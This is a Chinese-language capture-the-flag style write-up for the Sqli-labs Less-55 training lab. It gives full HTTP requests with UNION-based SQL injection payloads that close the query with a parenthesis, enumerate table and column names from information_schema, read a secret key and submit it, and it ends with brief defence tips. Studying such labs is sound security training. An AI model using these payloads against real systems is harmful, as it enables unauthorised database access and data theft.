## 题目: Sqli‑labs Less‑55

## 题目描述
GET参数id，数字括号闭合UNION注入，Challenge挑战关卡。目标库`challenges`，表名、secret列名、key每次Reset随机生成；总共有**14次请求机会**，超过次数自动重置全部数据；SQL语句为`id=($id)`，仅需要`)`闭合，不需要单引号。页面回显UNION查询第2、3列，尽量少请求拿到secret key提交通关。

## 核心原理
```php
$sql = "SELECT * FROM security.users WHERE id=($id) LIMIT 0,1";
```
关键点：id 被圆括号包裹，数字型，payload 使用`)`闭合，不要加单引号；页面回显第 2、3 列；每请求 id 参数计数 + 1，上限 14 次；Reset 按钮仅返回 refresh 头，脚本不会自动跳转，需要直接访问 setup 脚本才会真正重建随机库；目标数据存放在 challenges 库；首次访问页面生成 challenge 会话 Cookie，Cookie 丢失数据失效。

**解题思路**
1. 执行重置脚本，生成全新随机环境，获取 challenge 会话 cookie；
2. Burp 抓包修改 id 参数，`)`闭合，确认 UNION 回显位置；
3. UNION 嵌套子查询一次性获取 challenges 库随机表名与 secret 列名；
4. UNION 查询读取 secret key；
5. POST 提交 secret key 完成通关。

## 解题步骤
### 1. 确认闭合与回显位 Burp 包
```
GET /sqli-labs/Less-55/?id=-1) union select 1,2,3 -- - HTTP/1.1
Host: 127.0.0.1
```
页面`Your Login name:2`、`Your Password:3`，确认 2、3 列为回显位，消耗 1 次尝试次数。

### 2. 获取随机表名与 secret 列名 Burp 包
```
GET /sqli-labs/Less-55/?id=-1) union select 1,(select table_name from information_schema.tables where table_schema='challenges'),(select column_name from information_schema.columns where table_schema='challenges' limit 2,1) -- - HTTP/1.1
Host: 127.0.0.1
```
`Your Login name`返回随机表名，`Your Password`返回`secret_xxxx`列名。

### 3. 获取 secret key Burp 包
> 
> 将 payload 中`skh7ehoghz`替换实际表名，`secret_J314`替换实际 secret 列名
```
GET /sqli-labs/Less-55/?id=-1) union select 1,(select secret_J314 from skh7ehoghz),3 -- - HTTP/1.1
Host: 127.0.0.1
```
页面回显拿到 secret key 字符串。

### 4. 提交 key Burp 包
```
POST /sqli-labs/Less-55/index.php HTTP/1.1
Host: 127.0.0.1
Content‑Type: application/x‑www‑form‑urlencoded

key=rc7nQiIgHEIBMjBk53S4B7U4&answer_key=Submit
```
页面出现`Less‑54‑1.jpg`图片即为通关（关卡复用 54 的成功图片）。

## 踩坑记录
1. Reset 按钮只是页面刷新头，脚本环境要直接访问`setup‑db‑challenge.php`才真正重置数据库。
2. 闭合只用`)`，不要写成`')`，多加单引号直接语法错误。
3. 需要先访问页面拿到 challenge Cookie，没有 Cookie 无法绑定本次随机挑战数据。
4. 通关成功图片文件名依旧是`Less‑54‑1.jpg`，不要误以为未通关。
5. 上限 14 次机会，依旧使用子查询合并信息，减少请求消耗次数。
6. setup 脚本会 drop 重建 challenges 库，会把 54、55 等所有挑战关卡数据全部清空。

## 知识点总结
- Challenge 关卡注入点会变化：Less‑54 单引号闭合，Less‑55 是`id=($id)`括号数字闭合。
- `id=($id)`闭合技巧：payload 前缀使用`)`，不需要引号。
- 重置机制：`setup‑db‑challenge.php`负责删除重建 challenges 库，生成随机表、secret 字段。
- 限次注入思路：利用 union 嵌套子查询，单次请求获取多条信息，节约尝试次数。
- 防御：预编译参数绑定；接口请求次数限制；随机表名只能提高攻击门槛，不能作为安全防御。
